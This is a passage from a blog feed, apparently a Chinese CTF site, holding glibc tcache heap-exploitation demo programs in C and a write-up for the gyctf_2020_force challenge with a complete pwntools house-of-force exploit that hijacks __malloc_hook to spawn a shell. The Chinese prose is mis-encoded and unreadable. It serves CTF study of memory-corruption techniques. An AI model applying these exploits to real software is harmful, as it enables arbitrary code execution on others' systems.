class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// disable buffering</span></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-house-of-spirit-1"><a href="#tcache-house-of-spirit-1" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h4><p>æ­»æ€§ä¸æ”¹å‘€ï¼ğŸ˜‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-stashing-unlink-attack-1"><a href="#tcache-stashing-unlink-attack-1" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h4><p>å†™äº†ä¸ªå¯‚å¯â€¦.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>å‚è€ƒã€Šbuuåˆ·é¢˜è®°ä¹‹PWNç³»åˆ—ã€‹</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>â€‹        æ€»çš„æ¥è¯´ï¼ŒåŠ å…¥<code>tache</code>è®©å †é¢˜çš„å¯ç©æ€§å¢åŠ äº†ä¸å°‘ï¼Œä½†åˆ©ç”¨çš„æ‰‹æ³•éƒ½ä¸æ˜¯å¾ˆå¤æ‚ï¼Œåªèƒ½è¯´å¼€å‘è€…åœ¨å®‰å…¨æ€§å’Œæ•ˆç‡ä¹‹é—´ï¼Œæ›´åå‘äºæ•ˆç‡ï¼Œæ‰å¯¼è‡´è¿™ä¹ˆå¤šé—®é¢˜å‡ºç°ï¼Œä»¥å‰å¯¹<code>tache</code>çš„é¢˜ç›®å¾ˆææ…Œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFå°çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuåˆ·é¢˜è®°ä¹‹PWNç³»åˆ—</title>
      <link href="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/"/>
      <url>/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h3><h4 id="0x00-åŸºæœ¬ä¿¡æ¯"><a href="#0x00-åŸºæœ¬ä¿¡æ¯" class="headerlink" title="0x00 åŸºæœ¬ä¿¡æ¯"></a>0x00 åŸºæœ¬ä¿¡æ¯</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/1.png" class=""><p>ä¿æŠ¤å…¨å¼€ï¼ŒGOTä¹Ÿå†™ä¸äº†ï¼Œçœ‹è¿™ä¸ªåå­—å°±æ„Ÿè§‰æ˜¯house of forceâ€¦.</p><h4 id="0x01-IDAåˆ†æ"><a href="#0x01-IDAåˆ†æ" class="headerlink" title="0x01 IDAåˆ†æ"></a>0x01 IDAåˆ†æ</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/2.png" class=""><p>æ­£å¥½å°è¯äº†ä¹‹å‰çš„çŒœæµ‹ï¼Œæ»¡è¶³house of forceçš„æ¡ä»¶ï¼š</p><p>å¯è¦†ç›–Top chunkä¸º-1</p><p>èƒ½å¤Ÿåˆ†é…ä»»æ„å¤§å°çš„å †å—ä»¥åŠåˆ†é…çš„æ¬¡æ•°</p><p>å…ˆè¯•ä¸€ä¸‹è¦†ç›–Top chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heap_base = add(<span class="number">10</span>,payload)</span><br></pre></td></tr></table></figure><p>æ²¡å•¥æ¯›ç—…ï¼ä¸è®°å¾—å›å»çœ‹çœ‹house of force</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/3.png" class=""><p>æ¥ä¸‹æ¥å°±æ˜¯æƒ³ç€ä»»æ„åœ°å€å †å—åˆ†é…åˆ°å“ªé‡Œå»äº†ï¼Œå‰é¢çœ‹åˆ°ä¿æŠ¤å…¨å¼€ï¼Œå…¶å®æˆ‘ç¬¬ä¸€æƒ³æ³•æ˜¯è¦†ç›–GOTè¡¨çš„ï¼Œä½†æ˜¯RELOCä¿æŠ¤å…¨å¼€äº†ï¼Œæ²¡åŠæ³•äº†ï¼åªèƒ½è¦†ç›–malloc_hookï¼Œå†™one_gadgetäº†</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/4.png" class="" width="4"><h4 id="0x02-è§£é¢˜æ€è·¯"><a href="#0x02-è§£é¢˜æ€è·¯" class="headerlink" title="0x02 è§£é¢˜æ€è·¯"></a>0x02 è§£é¢˜æ€è·¯</h4><p>1.æ³„éœ²libcï¼ŒheapåŸºå€</p><p>2.ä¿®æ”¹Top chunkçš„sizeä¸º-1</p><p>3.åŠ«æŒ__malloc_hookä¿®æ”¹one_gadgetï¼Œè¿™é‡Œéœ€è¦reallocæ”¹å˜æ ˆç¯å¢ƒ</p><h4 id="0x03-å®Œæ•´EXP"><a href="#0x03-å®Œæ•´EXP" class="headerlink" title="0x03 å®Œæ•´EXP"></a>0x03 å®Œæ•´EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node4.buuoj.cn&#x27;, 26108)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;addr &#x27;</span>)</span><br><span class="line">    heap = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content\n&#x27;</span>, content)</span><br><span class="line">    <span class="keyword">return</span> heap</span><br><span class="line"></span><br><span class="line">libc_base = new(<span class="number">0x200000</span>, <span class="string">&#x27;aaa&#x27;</span>) + <span class="number">0x200ff0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base : &#x27;</span> + <span class="built_in">hex</span>(libc_base)</span><br><span class="line">heap_base = new(<span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap_base : &#x27;</span> + <span class="built_in">hex</span>(heap_base)</span><br><span class="line">top = heap_base + <span class="number">0x10</span></span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class="line">offset = malloc_hook - top</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;offset : &#x27;</span> + <span class="built_in">hex</span>(offset)</span><br><span class="line">realloc = libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf0274</span>, <span class="number">0xf1117</span>]</span><br><span class="line">one = onegadget[<span class="number">1</span>] + libc_base</span><br><span class="line">new(offset - <span class="number">0x33</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(one) + p64(realloc + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h4><h5 id="1-libcåŸºå€çš„è·å–"><a href="#1-libcåŸºå€çš„è·å–" class="headerlink" title="1.libcåŸºå€çš„è·å–"></a>1.libcåŸºå€çš„è·å–</h5><p>æˆ‘ä»¬é€šè¿‡IDAçœ‹åˆ°ï¼Œå½“æˆåŠŸåˆ†é…ä¸€ä¸ªå †å—çš„æ—¶å€™ï¼Œä¼šå°†æ­¤å †å—çš„åœ°å€æ‰“å°å‡ºæ¥ï¼Œé‚£ä¹ˆå½“å †å—sizeè¿‡å¤§çš„æ—¶å€™ï¼Œå®ƒä¼šé€šè¿‡mmapæ¥åˆ†é…å †å—ï¼Œæ­¤å †å—çš„åˆ†é…ä¼šç´§æŒ¨ç€libcï¼Œå°±èƒ½åˆ©ç”¨è¾“å‡ºçš„å †åœ°å€è®¡ç®—libcåœ°å€</p><h5 id="2-reallocå¹³è¡¡åŸç†"><a href="#2-reallocå¹³è¡¡åŸç†" class="headerlink" title="2.reallocå¹³è¡¡åŸç†"></a>2.reallocå¹³è¡¡åŸç†</h5><p>æˆ‘ä»¬åœ¨åŠ«æŒå®Œ__malloc_hookä¿®æ”¹æˆone_gadgetçš„æ—¶å€™ï¼Œå‘ç°å››ä¸ªone_gadgetéƒ½ä¸èƒ½getshellï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘é€šè¿‡reallocæ¥å¹³è¡¡æ ˆï¼Œå®ç°one_gadgetï¼Œä¸‹å›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é™¤äº†ç¬¬ä¸€ä¸ªone_gadgetçš„æ¡ä»¶æ˜¯raxçš„å€¼ä¸ºNULLï¼Œå…¶ä»–çš„éƒ½æ˜¯æ ˆä¸Šçš„æŸä¸€ä¸ªä½ç½®çš„å€¼ä¸ºNULLï¼Œæ‰€ä»¥ç”¨reallocæ¥å¹³è¡¡æ ˆå°±å¯ä»¥getshelläº†ï¼ï¼</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/12.png" class=""><p>æˆ‘ä»¬çŸ¥é“å•Šï¼Œå½“è¿›è¡Œmallocçš„æ—¶å€™å‘¢ï¼Œæ˜¯å…ˆåˆ¤æ–­__malloc_hookçš„å€¼æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºå°±è·³åˆ°è¿™ä¸ªå€¼çš„åœ°å€ä¸Šå»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¡«ä¸Šreallocçš„åœ°å€ï¼Œå°±å¯ä»¥è·³åˆ°reallocä¸Šå»</p><p>reallocä¹‹æ‰€ä»¥èƒ½å¤Ÿè°ƒæ•´æ ˆå¸§ï¼Œæ˜¯å› ä¸ºè¿›å…¥reallocå‡½æ•°ä¹‹åä¼špushä¸€ç³»åˆ—çš„å‚æ•°è¿›å»ï¼Œæ¥ç€å’Œ__malloc_hookä¸€æ ·ï¼Œåˆ¤æ–­realloc_hookæ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºå°±è·³è½¬è¿›å»æ‰§è¡Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¦æ§åˆ¶å¥½psuhå‚æ•°çš„ä¸ªæ•°ï¼Œä¹Ÿå°±æ˜¯åŠ ä¸Šä¸€å®šçš„åç§»</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/13.jpg" 